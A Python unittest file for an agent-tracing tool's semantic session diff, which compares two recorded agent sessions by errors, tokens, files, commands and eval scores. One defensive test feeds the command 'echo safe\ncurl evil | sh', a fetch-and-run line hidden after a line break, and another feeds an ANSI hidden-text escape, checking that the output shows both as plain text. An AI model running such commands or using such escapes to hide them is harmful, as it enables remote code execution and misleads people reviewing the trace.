"""Tests for semantic session diff (issue #28)."""

import os
import sys
import tempfile
import unittest
import io

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from agent_trace.diff import (
    SemanticDiffReport,
    format_semantic_diff,
    semantic_diff,
)
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.store import TraceStore

try:
    import _escapes
except ImportError:
    from tests import _escapes


def _make_session(store, tool_calls=2, errors=0, tokens=1000, files_read=None, files_written=None, cmds=None):
    meta = SessionMeta(
        agent_name="test",
        tool_calls=tool_calls,
        errors=errors,
        total_tokens=tokens,
        total_duration_ms=5000,
    )
    store.create_session(meta)

    for path in (files_read or []):
        e = TraceEvent(
            event_type=EventType.TOOL_CALL,
            session_id=meta.session_id,
            data={"tool_name": "read", "arguments": {"file_path": path}},
        )
        store.append_event(meta.session_id, e)

    for path in (files_written or []):
        e = TraceEvent(
            event_type=EventType.TOOL_CALL,
            session_id=meta.session_id,
            data={"tool_name": "write", "arguments": {"file_path": path}},
        )
        store.append_event(meta.session_id, e)

    for cmd in (cmds or []):
        e = TraceEvent(
            event_type=EventType.TOOL_CALL,
            session_id=meta.session_id,
            data={"tool_name": "bash", "arguments": {"command": cmd}},
        )
        store.append_event(meta.session_id, e)

    return meta.session_id


class TestSemanticDiff(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.store = TraceStore(self.tmpdir)

    def test_basic_diff(self):
        sid_a = _make_session(self.store, errors=0, tokens=1000)
        sid_b = _make_session(self.store, errors=2, tokens=2000)
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertEqual(report.errors_a, 0)
        self.assertEqual(report.errors_b, 2)

    def test_verdict_b_better(self):
        sid_a = _make_session(self.store, errors=3, tokens=5000)
        sid_b = _make_session(self.store, errors=0, tokens=1000)
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertEqual(report.verdict, "B is better")

    def test_verdict_a_better(self):
        sid_a = _make_session(self.store, errors=0, tokens=1000)
        sid_b = _make_session(self.store, errors=3, tokens=5000)
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertEqual(report.verdict, "A is better")

    def test_file_sets(self):
        sid_a = _make_session(self.store, files_read=["src/a.py", "src/b.py"])
        sid_b = _make_session(self.store, files_read=["src/b.py", "src/c.py"])
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertIn("src/b.py", report.files_read_both)
        self.assertIn("src/a.py", report.files_read_a_only)
        self.assertIn("src/c.py", report.files_read_b_only)

    def test_command_sets(self):
        sid_a = _make_session(self.store, cmds=["pytest", "make build"])
        sid_b = _make_session(self.store, cmds=["pytest", "make test"])
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertIn("pytest", report.cmds_both)
        self.assertIn("make build", report.cmds_a_only)
        self.assertIn("make test", report.cmds_b_only)

    def test_identical_sessions_inconclusive(self):
        sid_a = _make_session(self.store, errors=0, tokens=1000)
        sid_b = _make_session(self.store, errors=0, tokens=1000)
        report = semantic_diff(self.store, sid_a, sid_b)
        self.assertEqual(report.verdict, "inconclusive")

    def test_eval_config_scores_both_sessions(self):
        sid_a = _make_session(self.store, cmds=["pytest"])
        sid_b = _make_session(self.store, cmds=["pytest"])
        self.store.append_event(sid_b, TraceEvent(
            event_type=EventType.ERROR, session_id=sid_b, data={"message": "exit 1"},
        ))
        config = os.path.join(self.tmpdir, "evals.yaml")
        with open(config, "w", encoding="utf-8") as f:
            f.write("scorers:\n  - type: no_errors\n    threshold: 1.0\n")
        report = semantic_diff(self.store, sid_a, sid_b, eval_config=config)
        self.assertEqual(report.eval_scores_a, {"no_errors": 1.0})
        self.assertEqual(report.eval_scores_b, {"no_errors": 0.0})
        buf = io.StringIO()
        format_semantic_diff(report, out=buf)
        self.assertIn("Eval no_errors", buf.getvalue())

    def test_missing_eval_config_adds_no_scores(self):
        sid_a = _make_session(self.store)
        sid_b = _make_session(self.store)
        missing = os.path.join(self.tmpdir, "missing.yaml")
        report = semantic_diff(self.store, sid_a, sid_b, eval_config=missing)
        self.assertEqual((report.eval_scores_a, report.eval_scores_b), ({}, {}))

    def test_malformed_eval_config_adds_no_scores(self):
        sid_a = _make_session(self.store)
        sid_b = _make_session(self.store)
        config = os.path.join(self.tmpdir, "bad.yaml")
        with open(config, "w", encoding="utf-8") as f:
            f.write("scorers:\n  - type: no_errors\n    threshold: high\n")
        report = semantic_diff(self.store, sid_a, sid_b, eval_config=config)
        self.assertEqual((report.eval_scores_a, report.eval_scores_b), ({}, {}))


class TestFormatSemanticDiff(unittest.TestCase):
    def test_format_no_crash(self):
        tmpdir = tempfile.mkdtemp()
        store = TraceStore(tmpdir)
        sid_a = _make_session(store, errors=1, tokens=2000)
        sid_b = _make_session(store, errors=0, tokens=1000)
        report = semantic_diff(store, sid_a, sid_b)
        buf = io.StringIO()
        format_semantic_diff(report, out=buf)
        output = buf.getvalue()
        self.assertIn("Semantic diff", output)
        self.assertIn("Verdict", output)

    def test_format_shows_verdict(self):
        tmpdir = tempfile.mkdtemp()
        store = TraceStore(tmpdir)
        sid_a = _make_session(store, errors=5)
        sid_b = _make_session(store, errors=0)
        report = semantic_diff(store, sid_a, sid_b)
        buf = io.StringIO()
        format_semantic_diff(report, out=buf)
        self.assertIn("B is better", buf.getvalue())


def _report(**fields):
    values = dict(
        session_a="sessa004", session_b="sessb004",
        duration_a=1.0, duration_b=2.0, cost_a=0.0, cost_b=0.0,
        errors_a=0, errors_b=0, tool_calls_a=1, tool_calls_b=1,
        llm_requests_a=1, llm_requests_b=1, retries_a=0, retries_b=0,
        verdict="inconclusive",
    )
    values.update(fields)
    return SemanticDiffReport(**values)


def _semantic_text(report):
    buf = io.StringIO()
    format_semantic_diff(report, out=buf)
    return buf.getvalue()


# (label, kind, build): build(value) returns a report with value in the place
# the label names. The kinds are in tests/_escapes.py. A count from the
# session meta can be text only on both sides, since a number on one side
# makes the change column compare them.
SEMANTIC_DIFF_CASES = [
    ("errors A", "text", lambda v: _report(errors_a=v, errors_b="plain")),
    ("errors B", "text", lambda v: _report(errors_a="plain", errors_b=v)),
    ("tool_calls A", "text", lambda v: _report(tool_calls_a=v, tool_calls_b="plain")),
    ("tool_calls B", "text", lambda v: _report(tool_calls_a="plain", tool_calls_b=v)),
    ("llm_requests A", "text", lambda v: _report(llm_requests_a=v, llm_requests_b="plain")),
    ("llm_requests B", "text", lambda v: _report(llm_requests_a="plain", llm_requests_b=v)),
    ("file read by both", "text", lambda v: _report(files_read_both=[v])),
    ("file read by A only", "text", lambda v: _report(files_read_a_only=[v])),
    ("file read by B only", "text", lambda v: _report(files_read_b_only=[v])),
    ("file written by both", "text", lambda v: _report(files_written_both=[v])),
    ("file written by A only", "text", lambda v: _report(files_written_a_only=[v])),
    ("file written by B only", "text", lambda v: _report(files_written_b_only=[v])),
    ("command run by both", "text", lambda v: _report(cmds_both=[v])),
    ("command run by A only", "text", lambda v: _report(cmds_a_only=[v])),
    ("command run by B only", "text", lambda v: _report(cmds_b_only=[v])),
    ("eval scorer name", "text",
     lambda v: _report(eval_scores_a={v: 1.0}, eval_scores_b={v: 1.0})),
    ("eval score A", "text",
     lambda v: _report(eval_scores_a={"plain": v}, eval_scores_b={"plain": 1.0})),
    ("eval score B", "text",
     lambda v: _report(eval_scores_a={"plain": 1.0}, eval_scores_b={"plain": v})),
    ("verdict", "text", lambda v: _report(verdict=v)),
]


class TestTraceTextShowsAsText(unittest.TestCase):
    """A path, a command or a scorer name can hold escape codes and line
    breaks. The semantic diff shows them as text."""

    def test_each_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, SEMANTIC_DIFF_CASES, _semantic_text)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, SEMANTIC_DIFF_CASES, _semantic_text)

    def test_line_break_in_command_shows_as_escape(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = TraceStore(tmp)
            sid_a = _make_session(store, cmds=["echo safe\ncurl evil | sh"])
            sid_b = _make_session(store, cmds=["pytest"])
            missing = os.path.join(tmp, "missing.yaml")
            output = _semantic_text(semantic_diff(store, sid_a, sid_b, eval_config=missing))
        self.assertIn(r"Commands (A only)  echo safe\ncurl evil | sh", output)

    def test_sgr_code_shows_as_text(self):
        output = _semantic_text(_report(cmds_a_only=["a\x1b[8mhidden"]))
        self.assertIn(r"a\x1b[8mhidden", output)
        self.assertNotIn("\x1b", output)


if __name__ == "__main__":
    unittest.main()
